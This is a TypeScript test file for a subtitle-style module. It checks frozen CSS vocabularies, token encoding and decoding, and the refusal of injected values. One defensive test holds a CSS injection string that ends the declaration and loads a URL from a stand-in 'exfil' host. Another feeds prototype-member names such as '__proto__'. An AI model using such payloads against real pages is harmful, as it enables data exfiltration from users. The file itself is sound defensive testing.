/* The subtitle presentation model (W132-D item 2). No DOM: `cssVariables`
 * returns data, which is why the injection refusal below is testable at all. */
import { describe, expect, it } from "vitest";

import {
  DEFAULT_SUBTITLE_STYLE,
  SUBTITLE_BACKGROUNDS,
  SUBTITLE_COLOURS,
  SUBTITLE_CSS_VARIABLES,
  SUBTITLE_EDGES,
  SUBTITLE_SIZES,
  SUBTITLE_STYLE_FIELDS,
  cssVariables,
  decodeSubtitleStyle,
  encodeSubtitleStyle,
  withSubtitleStyleField
} from "./subtitle-style";

describe("the vocabulary is closed and frozen", () => {
  it.each([
    ["sizes", SUBTITLE_SIZES],
    ["colours", SUBTITLE_COLOURS],
    ["backgrounds", SUBTITLE_BACKGROUNDS],
    ["edges", SUBTITLE_EDGES]
  ])("%s is frozen, so no caller can add a value that reaches CSS", (_name, map) => {
    expect(Object.isFrozen(map)).toBe(true);
  });

  it("holds no CSS value containing a semicolon or a brace, which would end a declaration", () => {
    const values = [
      ...Object.values(SUBTITLE_COLOURS),
      ...Object.values(SUBTITLE_BACKGROUNDS),
      ...Object.values(SUBTITLE_EDGES)
    ];
    for (const value of values) {
      expect(value).not.toMatch(/[;{}]/);
      expect(value).not.toMatch(/url\(/i);
    }
  });

  it("scales by a multiplier rather than a pixel size", () => {
    for (const scale of Object.values(SUBTITLE_SIZES)) {
      expect(typeof scale).toBe("number");
      expect(scale).toBeGreaterThan(0);
    }
    expect(SUBTITLE_SIZES.medium).toBe(1);
  });

  it("defaults to a boxed cue, which is legible over footage nobody has seen", () => {
    expect(DEFAULT_SUBTITLE_STYLE.background).not.toBe("none");
    expect(Object.isFrozen(DEFAULT_SUBTITLE_STYLE)).toBe(true);
  });
});

describe("cssVariables projects tokens, never stored strings", () => {
  it("maps the default style onto the four custom properties", () => {
    const vars = cssVariables(DEFAULT_SUBTITLE_STYLE);
    expect(vars).toEqual({
      [SUBTITLE_CSS_VARIABLES.size]: "1",
      [SUBTITLE_CSS_VARIABLES.colour]: "#ffffff",
      [SUBTITLE_CSS_VARIABLES.background]: "rgba(0, 0, 0, 0.6)",
      [SUBTITLE_CSS_VARIABLES.edge]: "none"
    });
  });

  it("only ever emits values from the frozen vocabularies", () => {
    const allowed = new Set<string>([
      ...Object.values(SUBTITLE_SIZES).map(String),
      ...Object.values(SUBTITLE_COLOURS),
      ...Object.values(SUBTITLE_BACKGROUNDS),
      ...Object.values(SUBTITLE_EDGES)
    ]);
    for (const size of Object.keys(SUBTITLE_SIZES)) {
      for (const colour of Object.keys(SUBTITLE_COLOURS)) {
        const style = withSubtitleStyleField(
          withSubtitleStyleField(DEFAULT_SUBTITLE_STYLE, "size", size as never),
          "colour",
          colour as never
        );
        for (const value of Object.values(cssVariables(style))) {
          expect(allowed.has(value)).toBe(true);
        }
      }
    }
  });
});

describe("decodeSubtitleStyle refuses injection instead of sanitising it", () => {
  it("rejects a colour that would close the declaration and open another", () => {
    const hostile = "red; background-image: url(https://exfil.invalid/?c=1)";
    const decoded = decodeSubtitleStyle({ colour: hostile });
    expect(decoded.reasons.colour).toBe("unknown_token");
    expect(decoded.style.colour).toBe(DEFAULT_SUBTITLE_STYLE.colour);
    /* The hostile string reaches no CSS value at all. */
    expect(Object.values(cssVariables(decoded.style)).join("|")).not.toContain("exfil");
  });

  it("rejects a raw hex colour, because only tokens are a vocabulary", () => {
    expect(decodeSubtitleStyle({ colour: "#ff0000" }).reasons.colour).toBe("unknown_token");
  });

  it("will not let a prototype member name a value", () => {
    for (const token of ["toString", "__proto__", "constructor", "hasOwnProperty"]) {
      const decoded = decodeSubtitleStyle({ edge: token });
      expect(decoded.reasons.edge).toBe("unknown_token");
      expect(decoded.style.edge).toBe(DEFAULT_SUBTITLE_STYLE.edge);
    }
  });
});

describe("decodeSubtitleStyle keeps the fields it understood", () => {
  it("round-trips a complete style", () => {
    const style = { size: "large", colour: "yellow", background: "none", edge: "outline" } as const;
    const decoded = decodeSubtitleStyle(encodeSubtitleStyle(style));
    expect(decoded.style).toEqual(style);
    expect(decoded.complete).toBe(true);
    for (const field of SUBTITLE_STYLE_FIELDS) expect(decoded.reasons[field]).toBe("stored");
  });

  it("keeps three good fields when one is a token this build renamed", () => {
    const decoded = decodeSubtitleStyle({
      size: "extra-large",
      colour: "cyan",
      background: "translucent-black",
      edge: "uniform"
    });
    expect(decoded.style.size).toBe("extra-large");
    expect(decoded.style.colour).toBe("cyan");
    expect(decoded.reasons.edge).toBe("unknown_token");
    expect(decoded.style.edge).toBe(DEFAULT_SUBTITLE_STYLE.edge);
    expect(decoded.complete).toBe(false);
  });

  it("calls an absent field not_chosen, which is not the same fact as a bad one", () => {
    const decoded = decodeSubtitleStyle({ size: "small" });
    expect(decoded.reasons.size).toBe("stored");
    expect(decoded.reasons.colour).toBe("not_chosen");
    expect(decoded.reasons.edge).toBe("not_chosen");
    expect(decoded.complete).toBe(false);
  });

  it.each([null, undefined, "", 7, [], "medium"])(
    "treats the non-object %p as nothing chosen and still answers a usable style",
    (raw) => {
      const decoded = decodeSubtitleStyle(raw);
      expect(decoded.style).toEqual(DEFAULT_SUBTITLE_STYLE);
      for (const field of SUBTITLE_STYLE_FIELDS) {
        expect(decoded.reasons[field]).toBe("not_chosen");
      }
    }
  );

  it("treats an empty string in a field as not chosen rather than an unknown token", () => {
    expect(decodeSubtitleStyle({ colour: "" }).reasons.colour).toBe("not_chosen");
  });

  it("rejects a non-string value in a field", () => {
    expect(decodeSubtitleStyle({ size: 1.5 }).reasons.size).toBe("unknown_token");
    expect(decodeSubtitleStyle({ size: { large: true } }).reasons.size).toBe("unknown_token");
  });

  it("freezes what it returns, so a style cannot be mutated after it was validated", () => {
    expect(Object.isFrozen(decodeSubtitleStyle({}).style)).toBe(true);
  });
});

describe("encodeSubtitleStyle stores tokens and not resolved CSS", () => {
  it("writes the token names only", () => {
    const encoded = encodeSubtitleStyle(DEFAULT_SUBTITLE_STYLE);
    expect(encoded).toEqual({
      size: "medium",
      colour: "white",
      background: "translucent-black",
      edge: "none"
    });
    expect(Object.values(encoded).join("|")).not.toContain("#");
    expect(Object.values(encoded).join("|")).not.toContain("rgba");
  });
});

describe("withSubtitleStyleField", () => {
  it("changes one field and keeps the rest", () => {
    const next = withSubtitleStyleField(DEFAULT_SUBTITLE_STYLE, "edge", "drop-shadow");
    expect(next.edge).toBe("drop-shadow");
    expect(next.colour).toBe(DEFAULT_SUBTITLE_STYLE.colour);
    expect(DEFAULT_SUBTITLE_STYLE.edge).toBe("none");
  });
});
